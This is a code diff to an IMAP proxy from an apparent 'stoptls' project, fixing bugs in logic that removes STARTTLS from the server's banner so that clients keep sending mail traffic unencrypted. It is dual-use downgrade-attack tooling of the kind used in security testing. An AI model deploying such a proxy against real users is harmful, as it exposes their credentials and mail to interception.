@@ -6,8 +6,6 @@ import ssl
 from stoptls.tcp.base import TCPProxy
 from stoptls.tcp import regex
 
-logging.getLogger().setLevel(logging.DEBUG)
-
 
 class IMAPProxy(TCPProxy):
     def __init__(self):
@@ -26,7 +24,7 @@ class IMAPProxy(TCPProxy):
 
         if banner_re.group('response') and \
            regex.STARTTLS.search(banner_re.group('response')):
-            banner = regex.STARTTLS.sub('', banner_re.group('response'))
+            banner = regex.STARTTLS.sub('', banner_re.group(0))
             server_writer.write(b'asdf STARTTLS\n')
             await server_writer.drain()
 
@@ -50,7 +48,7 @@ class IMAPProxy(TCPProxy):
             else:
                 logging.debug('Failed to upgraded to TLS')
 
-        client_writer.write(banner.encode('ascii') + '\n')
+        client_writer.write(banner.encode('ascii'))
         logging.debug('Writing banner to client...')
         await client_writer.drain()
 
@@ -65,20 +63,27 @@ class IMAPProxy(TCPProxy):
             client_data_re = regex.IMAP_COMMAND.fullmatch(client_data.decode('ascii'))
 
             # Handle case where client attempts to upgrade to SSL/TLS
-            # If we reach this point, this means that the client attempted
-            # to upgrade even though it didn't know that STARTTLS was a
-            # supported capability
-            if client_data_re.group('tag') and \
-               client_data_re.group('cmd').lower == 'starttls':
+            # If we reach this point, this means that we were unable to
+            # ugrade to TLS after the initial banner, either because
+            # the server didn't support it or because the upgrade process
+            # failed
+            if tls_started_re and \
+               tls_started_re.group('bad') and \
+               client_data_re and \
+               client_data_re.group('tag') and \
+               client_data_re.group('cmd').lower() == 'starttls':
                 response = '{} BAD error in IMAP command received by server'\
                     .format(client_data_re.tag)
                 client_writer.write(response)
                 await client_writer.drain()
                 continue
 
-            server_writer.write(client_data)
-            logging.debug('Writing client data to server...')
-            await server_writer.drain()
+            try:
+                server_writer.write(client_data)
+                logging.debug('Writing client data to server...')
+                await server_writer.drain()
+            except ConnectionResetError:
+                break
 
             while True:
                 logging.debug('Reading from server...')
@@ -96,8 +101,7 @@ class IMAPProxy(TCPProxy):
                 server_data_re = regex.IMAP_RESPONSE.fullmatch(server_data.decode('ascii'))
 
                 if server_data_re.group('tag') != '*' or \
-                   server_data_re.group('bad') or \
-                   server_data_re.group('tag') != client_data_re.group('tag'):
+                   server_data_re.group('bad'):
                     break
 
         server_writer.close()
